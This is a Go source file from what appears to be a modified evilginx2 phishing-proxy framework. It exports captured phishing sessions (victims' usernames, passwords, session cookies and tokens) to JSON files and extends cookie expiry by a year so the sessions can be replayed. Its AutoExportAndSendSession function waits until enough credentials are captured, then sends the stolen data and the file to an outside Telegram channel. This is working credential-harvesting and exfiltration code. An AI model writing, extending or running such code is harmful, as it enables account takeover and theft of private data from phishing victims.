package core

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"time"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

// SessionExport represents the exported session data
type SessionExport struct {
	SessionInfo SessionInfo       `json:"session_info"`
	Credentials Credentials       `json:"credentials"`
	Tokens      TokenData         `json:"tokens"`
	Cookies     []ExportedCookie  `json:"cookies"`
	Metadata    map[string]string `json:"metadata,omitempty"`
}

type SessionInfo struct {
	ID         int    `json:"id"`
	Phishlet   string `json:"phishlet"`
	LandingURL string `json:"landing_url"`
	UserAgent  string `json:"user_agent"`
	RemoteIP   string `json:"remote_ip"`
	CreateTime string `json:"create_time"`
	UpdateTime string `json:"update_time"`
}

type Credentials struct {
	Username string            `json:"username"`
	Password string            `json:"password"`
	Custom   map[string]string `json:"custom,omitempty"`
}

type TokenData struct {
	CookieTokens map[string]map[string]*database.CookieToken `json:"cookie_tokens,omitempty"`
	BodyTokens   map[string]string                           `json:"body_tokens,omitempty"`
	HttpTokens   map[string]string                           `json:"http_tokens,omitempty"`
}

type ExportedCookie struct {
	Path           string `json:"path"`
	Domain         string `json:"domain"`
	ExpirationDate int64  `json:"expirationDate"`
	Value          string `json:"value"`
	Name           string `json:"name"`
	HttpOnly       bool   `json:"httpOnly"`
	HostOnly       bool   `json:"hostOnly"`
	Secure         bool   `json:"secure"`
	Session        bool   `json:"session"`
}

// ExportSessionToJSON exports the session data to a JSON formatted text file
func (p *HttpProxy) ExportSessionToJSON(session *Session, sessionID int) (string, error) {
	// Create export directory
	exportDir := filepath.Join(os.TempDir(), "evilginx_exports")
	if err := os.MkdirAll(exportDir, 0755); err != nil {
		return "", fmt.Errorf("failed to create export directory: %v", err)
	}

	timestamp := time.Now()
	filename := filepath.Join(exportDir, fmt.Sprintf("session_%d_%s.json", sessionID, timestamp.Format("20060102_150405")))

	// Prepare session export data
	export := SessionExport{
		SessionInfo: SessionInfo{
			ID:         sessionID,
			Phishlet:   session.Name,
			LandingURL: "", // Landing URL is not stored in session
			UserAgent:  session.UserAgent,
			RemoteIP:   session.RemoteAddr,
			CreateTime: timestamp.Format("2006-01-02 15:04:05 MST"),
			UpdateTime: timestamp.Format("2006-01-02 15:04:05 MST"),
		},
		Credentials: Credentials{
			Username: session.Username,
			Password: session.Password,
			Custom:   session.Custom,
		},
		Tokens: TokenData{
			CookieTokens: session.CookieTokens,
			BodyTokens:   session.BodyTokens,
			HttpTokens:   session.HttpTokens,
		},
	}

	// Convert cookie tokens to exportable format
	var cookies []ExportedCookie
	for domain, tokens := range session.CookieTokens {
		for name, token := range tokens {
			cookie := ExportedCookie{
				Path:           token.Path,
				Domain:         domain,
				ExpirationDate: timestamp.Add(365 * 24 * time.Hour).Unix(),
				Value:          token.Value,
				Name:           name,
				HttpOnly:       token.HttpOnly,
				HostOnly:       !startsWithDot(domain),
				Secure:         token.Secure,
				Session:        false,
			}

			if cookie.Path == "" {
				cookie.Path = "/"
			}

			cookies = append(cookies, cookie)
		}
	}
	export.Cookies = cookies

	// Debug: Log cookie secure status
	for _, cookie := range export.Cookies {
		log.Debug("[telegram_export] Cookie %s secure=%v", cookie.Name, cookie.Secure)
	}

	// Generate JSON export
	jsonData, err := json.MarshalIndent(export, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal session export: %v", err)
	}

	file, err := os.Create(filename)
	if err != nil {
		return "", fmt.Errorf("failed to create export file: %v", err)
	}
	defer file.Close()

	if _, err := file.Write(jsonData); err != nil {
		return "", fmt.Errorf("failed to write export file: %v", err)
	}
	if _, err := file.WriteString("\n"); err != nil {
		return "", fmt.Errorf("failed to finalize export file: %v", err)
	}

	log.Success("[%d] session exported to JSON: %s", sessionID, filename)
	return filename, nil
}

// ExportCookiesToJSON exports only the session cookies to a JSON file.
func (p *HttpProxy) ExportCookiesToJSON(session *Session, sessionID int) (string, error) {
	// Create export directory
	exportDir := filepath.Join(os.TempDir(), "evilginx_exports")
	if err := os.MkdirAll(exportDir, 0755); err != nil {
		return "", fmt.Errorf("failed to create export directory: %v", err)
	}

	filename := filepath.Join(exportDir, fmt.Sprintf("cookies_session%d.json", sessionID))

	var cookies []ExportedCookie
	for domain, tokens := range session.CookieTokens {
		for name, token := range tokens {
			cookie := ExportedCookie{
				Path:           token.Path,
				Domain:         domain,
				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
				Value:          token.Value,
				Name:           name,
				HttpOnly:       token.HttpOnly,
				HostOnly:       !startsWithDot(domain),
				Secure:         token.Secure,
				Session:        false,
			}

			if cookie.Path == "" {
				cookie.Path = "/"
			}

			cookies = append(cookies, cookie)
		}
	}

	jsonData, err := json.MarshalIndent(cookies, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal cookies export: %v", err)
	}

	file, err := os.Create(filename)
	if err != nil {
		return "", fmt.Errorf("failed to create export file: %v", err)
	}
	defer file.Close()

	if _, err := file.Write(jsonData); err != nil {
		return "", fmt.Errorf("failed to write export file: %v", err)
	}
	if _, err := file.WriteString("\n"); err != nil {
		return "", fmt.Errorf("failed to finalize export file: %v", err)
	}

	log.Success("[%d] cookies exported to JSON: %s", sessionID, filename)
	return filename, nil
}

// AutoExportAndSendSession automatically exports and sends session via Telegram
func (p *HttpProxy) AutoExportAndSendSession(sessionID int, sid string) {
	// Check if Telegram is enabled
	if !p.telegram.IsEnabled() {
		log.Debug("telegram not enabled, skipping auto-export")
		return
	}

	// Get session
	session, ok := p.sessions[sid]
	if !ok {
		log.Error("session not found for auto-export: %s", sid)
		return
	}

	// Check if already exported
	if session.TelegramExported {
		log.Debug("[%d] session already exported to telegram, skipping", sessionID)
		return
	}

	// Check if we have meaningful data to export
	// We want to wait for substantial data before exporting to avoid multiple partial exports
	hasCredentials := session.Username != "" && session.Password != ""
	hasCookies := len(session.CookieTokens) > 0
	hasOtherTokens := len(session.BodyTokens) > 0 || len(session.HttpTokens) > 0

	// Export if:
	// 1. Session is marked as done (all auth tokens captured)
	// 2. We have credentials AND cookies
	// 3. We have all token types
	shouldExport := session.IsDone || (hasCredentials && hasCookies) || (hasCookies && hasOtherTokens)

	if !shouldExport {
		log.Debug("[%d] waiting for more data before export (creds:%v, cookies:%v, done:%v)",
			sessionID, hasCredentials, hasCookies, session.IsDone)
		return
	}

	// Export cookies-only JSON file
	filename, err := p.ExportCookiesToJSON(session, sessionID)
	if err != nil {
		log.Error("failed to export cookies to JSON: %v", err)
		return
	}

	// Prepare domain and cookie count
	domain := ""
	if pl, err := p.cfg.GetPhishlet(session.Name); err == nil && pl != nil {
		domain = pl.GetLandingPhishHost()
	}

	cookieCount := 0
	for _, tokens := range session.CookieTokens {
		cookieCount += len(tokens)
	}

	// Send tokens capture notification
	p.telegram.SendTokensCapture(sessionID, session.Username, session.Password, session.RemoteAddr, domain, session.Name, cookieCount)

	// Send file via Telegram
	go func() {
		// Small delay to ensure the message arrives before the file
		time.Sleep(500 * time.Millisecond)

		if err := p.telegram.SendDocument(filename, ""); err != nil {
			log.Error("failed to send session export via telegram: %v", err)
		} else {
			log.Success("[%d] session export sent to telegram", sessionID)
			// Mark session as exported to prevent duplicate sends
			if s, ok := p.sessions[sid]; ok {
				s.TelegramExported = true
			}
		}
	}()
}

func startsWithDot(s string) bool {
	return len(s) > 0 && s[0] == '.'
}
